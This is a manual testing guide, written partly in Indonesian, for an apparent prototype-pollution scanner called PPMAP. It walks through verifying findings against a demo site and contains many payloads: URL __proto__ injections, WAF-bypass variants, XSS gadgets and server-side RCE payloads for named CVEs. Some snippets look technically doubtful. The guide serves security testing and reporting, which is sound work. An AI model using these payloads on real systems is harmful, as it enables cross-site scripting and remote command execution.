# PPMAP v4.0.0 - Manual Testing Guide (Panduan Testing Manual)

## Object.defineProperty Descriptor Pollution (PortSwigger 2024)

This technique exploits how `Object.defineProperty` descriptor objects inherit from `Object.prototype`.

### Vulnerable Code Pattern
```javascript
let config = {transport_url: false};
Object.defineProperty(config, 'transport_url', {
    configurable: false,
    writable: false
});
```

### Exploit Methodology
1. Identify pages using `Object.defineProperty`
2. Pollute `Object.prototype.value` with XSS payload
3. Descriptor inherits `value` → property gets polluted value

### Payloads
```
?__proto__[value]=data:,alert(1)//
?__proto__[value]=data:,alert(document.domain)//
?constructor[prototype][value]=data:,alert(1)//
?__proto__[writable]=true
?__proto__[configurable]=true
```

### PPMAP Auto-Detection
```bash
python ppmap.py --scan "TARGET_URL" --timeout 60
# Look for "Descriptor PP" in Tier 4 output
```

> Panduan ini menjelaskan cara **memverifikasi hasil scan secara manual** di browser target menggunakan console.

---

## 🔐 Authenticated Scanning with Burp Suite Request

PPMAP sekarang mendukung scanning menggunakan request file yang diekspor dari Burp Suite. Ini sangat berguna untuk:
1.  **Authenticated Scans**: Menggunakan session cookies yang valid.
2.  **Server-Side One-Shot**: Test POST endpoint dengan JSON body.
3.  **Complex Headers**: Bypass WAF/Filter yang butuh header spesifik.

### Cara Penggunaan:
1.  Di Burp Suite, klik kanan pada request -> "Copy to file" (atau copy text raw request ke file `request.txt`).
2.  Jalankan PPMAP:
    ```bash
    python ppmap.py --request request.txt
    ```

### Fitur SSPP Injection:
Jika request yang diberikan adalah **POST** dengan **JSON body**, PPMAP akan otomatis:
1.  Mendeteksi JSON body.
2.  Melakukan **deep injection** payload Prototype Pollution ke dalam JSON tersebut.
3.  Mengirim request yang sudah di-pollute dengan session asli.
4.  Menganalisis response untuk anomali (JSON spaces, status code, error).

---

## 📋 Hasil Scan Anda

```
Target: http://zero.webappsecurity.com/
jQuery Version: 1.8.2 (VULNERABLE)
Total Vulnerabilities: 20

CRITICAL: jQuery PP + React Flight
HIGH: Function.prototype + UTF-7 Bypass + WAF Bypass
```

---

## 🎯 BAGIAN 1: Testing jQuery Prototype Pollution (CVE-2019-11358)

### Langkah 1: Buka Browser & Console
```
1. Buka: http://zero.webappsecurity.com/
2. Tekan: Ctrl+Shift+J (Chrome) atau F12 lalu buka Console tab
3. Pastikan jQuery terdeteksi: ketik "jQuery" → tekan Enter → harusnya muncul jQuery object
```

### Langkah 2: Jalankan Payload jQuery PP
**Tools mendeteksi:** `$.extend()` vulnerable
**Cara test manual:**

```javascript
// Test 1: Basic Prototype Pollution via $.extend()
$.extend(true, {}, {"__proto__": {"polluted": "YES"}});
Object.prototype.polluted
// Expected: "YES" (jika vulnerable)
```

Jika hasilnya `"YES"`, maka **jQuery PP berhasil!** ✓

### Langkah 3: Test dengan Property Lain
```javascript
// Test 2: Coba ubah method behavior
$.extend(true, {}, {"__proto__": {"toString": function(){return "HACKED"}}});
({}).toString()
// Expected: "HACKED" (jika berhasil)
```

### Langkah 4: Lihat Efek di DOM
```javascript
// Test 3: Cek apakah Object.prototype berubah
Object.getOwnPropertyNames(Object.prototype).includes("polluted")
// Jika true = prototype sudah di-pollute!
```

---

## 🎯 BAGIAN 2: Testing Function.prototype Chain Pollution

**Tools mendeteksi:** `Function.prototype` vulnerable via URL

### Langkah 1: Test Constructor Chain
```javascript
// Test 1: Akses constructor.prototype
constructor.constructor.prototype.polluted = "HACKED"
({}).polluted
// Expected: "HACKED" (jika vulnerable)
```

### Langkah 2: Coba XSS via Function Prototype
```javascript
// Test 2: Ubah Function behavior
Object.getPrototypeOf(Object.getPrototypeOf(Object.getPrototypeOf([]))).map = function(){
    alert("FUNCTION PROTOTYPE POLLUTED!")
    return []
}

// Kemudian trigger di halaman:
[1,2,3].map(x => x)  // Harus trigger alert
```

### Langkah 3: Test Constructor.prototype
```javascript
// Test 3: Constructor chain
var x = {};
x.constructor.constructor.prototype.polluted = true
({}).polluted === true
// Expected: true
```

---

## 🎯 BAGIAN 3: Testing React Flight Protocol (CVE-2025-55182)

**Tools mendeteksi:** React Flight Protocol vulnerable

### Langkah 1: Cek React / Next.js
```javascript
// Check if React exists
typeof React !== 'undefined' ? "React ditemukan" : "React tidak ada"
typeof next !== 'undefined' ? "Next.js ditemukan" : "Next.js tidak ada"
```

### Langkah 2: Test React Flight Deserialization
```javascript
// Coba payload yang tools temukan
const payload = {
    "_formData": {
        "get": "$1:then:constructor"
    }
}

// Coba injeksi (jika ada form):
document.querySelector('form').innerHTML = JSON.stringify(payload)

// Atau test dengan developer tools:
JSON.stringify({"_formData": {"get": "$1:then:constructor"}})
```

### Langkah 3: Check Constructor Access
```javascript
// Test constructor chain di React context
const obj = {"_formData": {"get": "$1:then:constructor"}}
obj._formData.get === "$1:then:constructor" ? "Constructor accessible" : "Safe"
```

---

## 🎯 BAGIAN 4: Testing Charset Override (UTF-7 Bypass)

**Tools mendeteksi:** UTF-7 & ISO-2022 charset bypass

### Langkah 1: Test UTF-7 Encoding Injection
```javascript
// Test 1: Inject charset ke response
Object.prototype.charset = "utf-7"
document.charset
// Expected: "utf-7" (jika vulnerable)
```

### Langkah 2: Test Encoding dalam Meta Tag
```javascript
// Test 2: Cek meta charset
document.querySelector('meta[charset]')?.getAttribute('charset')
// Coba ubah via prototype:
Object.prototype.encoding = "iso-2022-jp"
```

### Langkah 3: Test dengan XSS Payload
```javascript
// Test 3: UTF-7 XSS combination
// Coba payload dengan encoding
const payload = "+ADw-img src=x onerror=alert(1)+AD4-"
// Di UTF-7 = <img src=x onerror=alert(1)>
```

---

## 🎯 BAGIAN 5: Testing WAF Bypass Techniques

**Tools mendeteksi:** 9 WAF bypass methods

### Test Case Variation
```javascript
// Test 1: Case variation bypass
// URL: ?__PROTO__[bypass]=true
// URL: ?__Proto__[bypass]=true

Object.prototype.bypass = "BYPASSED_VIA_CASE"
```

### Test URL Encoding
```javascript
// Test 2: URL encoding bypass
// Payload: ?__proto__%5B...%5D=true
// %5B = [ dan %5D = ]

const payload = "__proto__"
decodeURIComponent("__proto__%5Btest%5D")
// Result: __proto__[test]
```

### Test JSON Payload
```javascript
// Test 3: JSON-based bypass
const jsonPayload = {"__proto__": {"waf_bypass": "true"}}
JSON.stringify(jsonPayload)
// Result: {"__proto__":{"waf_bypass":"true"}}
```

---

## 🎯 BAGIAN 6: XSS Verification via Prototype Pollution

**Kombinasi PP + XSS untuk RCE**

### Test 1: Modify Alert via Prototype
```javascript
// Ubah alert behavior
Object.prototype.alert = function(msg){
    console.log("ORIGINAL ALERT HIJACKED: " + msg)
    return "intercepted"
}

alert("test")
// Expected: console log muncul = prototype polluted!
```

### Test 2: DOM Event Handler Injection
```javascript
// Inject event handler via prototype
Object.prototype.onclick = function(){
    console.log("CLICKED - Prototype Polluted!")
}

document.body.onclick = null  // Reset
document.body.click()  // Trigger prototype version
```

### Test 3: Script Injection
```javascript
// Coba inject script behavior
Object.prototype.src = "javascript:alert(1)"
const img = document.createElement('img')
img.setAttribute('src', img.src)  // Will use prototype.src
```

---

## 🎯 BAGIAN 7: Tier 5 - Research Gap Features (NEW v3.5)

### 7.1 Testing CORS Header Pollution
**Tools mendeteksi:** Potensi polusi header CORS via prototype.

**Cara test manual:**
```javascript
// Pollute exposedHeaders
Object.prototype.exposedHeaders = "X-PPMAP-POLLUTED"

// Trigger request (misal fetch)
fetch('/')
// Cek response headers di Network tab:
// Access-Control-Expose-Headers should contain "X-PPMAP-POLLUTED"
```

---

### 7.2 Testing Storage API Pollution
**Tools mendeteksi:** Vulnerability pada localStorage/sessionStorage.

**Cara test manual:**
```javascript
// Pollute property yang sering diakses langsung
Object.prototype.debug = "true"

// Cek apakah aplikasi membaca dari prototype saat mengakses storage
localStorage.getItem('debug') // null
localStorage.debug            // "true" ← VULNERABLE!
```

---

### 7.3 Testing Third-Party Library Gadgets
**Tools mendeteksi:** Gadget pada library eksternal (GA, GTM, Vue, etc).

**Google Analytics Example:**
```javascript
// Pollute hitCallback gadget
Object.prototype.hitCallback = function(){ alert('GA GADGET POLLUTED') }

// GA akan otomatis eksekusi saat mengirim hit
```

---

## 🎯 BAGIAN 8: Tier 6 - CVE-Specific & Bug Bounty (NEW v3.5)

### 8.1 Testing Lodash CVE (CVE-2020-8203)
**Tools mendeteksi:** Vulnerable Lodash version.

**Cara test manual:**
```javascript
// CVE-2020-8203 (_.merge)
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
({}).polluted // "yes"
```

---

### 8.2 Testing deep-merge RCE (CVE-2024-38986)
**Tools mendeteksi:** @75lb/deep-merge vulnerable.

**Exploit Payload (untuk server-side RCE):**
```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":!whoami\n"
  }
}
```

---

### 8.3 Testing Kibana Telemetry RCE (HackerOne #852613)
**Tools mendeteksi:** Kibana Telemetry collector vulnerable.

**Payload Verification:**
```json
{
  "path": "__proto__.env.NODE_OPTIONS",
  "value": "--require /proc/self/environ"
}
```

---

### 8.4 Testing Elastic XSS (HackerOne #998398)
**Tools mendeteksi:** Elastic UI XSS via prototype.

**Payload:**
```javascript
// Pollute EUI specific property
Object.prototype.innerHtml = "<img src=x onerror=alert('Elastic_XSS')>"
// Refresh atau buka EUI component
```

---

## 🎯 BAGIAN 9: Testing Blitz.js RCE Chain (CVE-2022-23631)
**Tools mendeteksi:** Blitz.js / Superjson vulnerability.

**Superjson Manual Test:**
```javascript
const { deserialize } = require('superjson');
const polluted = deserialize({
    json: { "__proto__": { "shell": "vim" } },
    meta: { values: { "__proto__": ["class"] } }
});
// Cek jika global prototype tercemar
```

---

## 📊 Verification Checklist

| Vulnerability | Manual Test | Expected Result | Status |
|---|---|---|---|
| **jQuery PP** | `Object.prototype.polluted === "YES"` | YES | ✓ Test di browser |
| **Function.proto** | `({}).polluted === true` | true | ✓ Test di browser |
| **React Flight** | JSON parse `_formData` | Constructor accessed | ✓ Check console |
| **UTF-7 Bypass** | `Object.prototype.charset` | "utf-7" | ✓ Test di browser |
| **WAF Bypass** | Different payload formats | All bypass WAF | ✓ Test di browser |

---

## 🔧 Contoh URL untuk Testing Manual

Gunakan payloads dari tools dengan cara ini:

### jQuery PP via URL
```
http://zero.webappsecurity.com/?__proto__[testprop]=1
// Kemudian di console:
Object.prototype.testprop  // Cek hasilnya
```

### Function.prototype via URL
```
http://zero.webappsecurity.com/?constructor[constructor][prototype][test]=1
// Kemudian di console:
({}).test  // Cek hasilnya
```

### WAF Bypass Variations
```
// Case variation
http://zero.webappsecurity.com/?__PROTO__[test]=1

// URL encoding
http://zero.webappsecurity.com/?__proto__%5Btest%5D=1

// Nested object
http://zero.webappsecurity.com/?a[b][__proto__][test]=1
```

---

## 🎬 Step-by-Step Interactive Testing

### Scenario: Exploit jQuery PP untuk XSS

```javascript
// Step 1: Inject property ke prototype
$.extend(true, {}, {"__proto__": {"innerHTML": "<img src=x onerror=alert('XSS')>"}})

// Step 2: Cek apakah innerHTML berubah globally
Object.prototype.innerHTML

// Step 3: Trigger rendering
document.body.innerHTML = document.body.innerHTML  // Re-render

// Result: Alert muncul = XSS via PP berhasil!
```

### Scenario: Exploit Constructor.prototype untuk RCE

```javascript
// Step 1: Akses constructor chain
const proto = Object.getPrototypeOf(Object.getPrototypeOf(Object.getPrototypeOf(Function)))

// Step 2: Ubah Function constructor
proto.constructor = function(code){
    console.log("FUNCTION CONSTRUCTOR HIJACKED: " + code)
    return eval(code)
}

// Step 3: Test dengan new Function
new Function('alert("RCE via PP!")')()

// Result: Alert muncul = RCE potential terdeteksi!
```

---

## 🚨 Safety Tips

⚠️ **PENTING**: Testing hanya pada sistem yang Anda miliki/authorized!

- ✅ Gunakan localhost atau test server
- ✅ Jangan exploit production tanpa permission
- ✅ Catat semua hasil testing
- ✅ Report responsibly ke vendor

---

## 📌 Contoh Output yang Diharapkan

### ✓ Vulnerable (Negative Result = PP Works!)
```javascript
> $.extend(true, {}, {"__proto__": {"polluted": "YES"}});
undefined

> Object.prototype.polluted
"YES"  ← Ini berarti VULNERABLE!
```

### ✓ XSS via PP
```javascript
> Object.prototype.onclick = function(){alert('CLICKED')}
function(){alert('CLICKED')}

> document.body.onclick
function(){alert('CLICKED')}  ← Prototype pollution confirmed!
```

### ✓ Function.prototype Chain
```javascript
> Object.getPrototypeOf(Object.getPrototypeOf(Object.getPrototypeOf({}))).polluted = "HACKED"
"HACKED"

> ({}).polluted
"HACKED"  ← Chain pollution successful!
```

---

## 🎯 Quick Reference Commands

```javascript
// Check jQuery
jQuery.fn.jquery

// Check prototype pollution
Object.prototype.testprop = "yes"; ({}).testprop

// Check constructor
Object.getPrototypeOf({}).constructor

// Check function prototype
Function.prototype.test = "polluted"; (function(){}).test

// Check __proto__
({}).\_\_proto\_\_.constructor

// Cleanup (remove pollution)
delete Object.prototype.testprop
```

---

## 📝 Reporting Template

Ketika Anda berhasil testing manual, gunakan template ini:

```
TARGET: http://zero.webappsecurity.com/
DATE: 2026-01-23
VULNERABILITY: jQuery Prototype Pollution (CVE-2019-11358)
SEVERITY: CRITICAL

STEPS TO REPRODUCE:
1. Open browser console
2. Run: $.extend(true, {}, {"__proto__": {"polluted": "YES"}});
3. Run: Object.prototype.polluted
4. Expected: "YES"
5. Actual: "YES" ✓ VULNERABLE

IMPACT:
- Can inject properties to all objects
- Potential for XSS via prototype chain
- Can affect application behavior globally

PROOF:
- Screenshot: [console showing Object.prototype.polluted = "YES"]
- Payload: {"__proto__": {"polluted": "YES"}}
```

---

Sudah siap? Mari testing manual di browser! 🚀
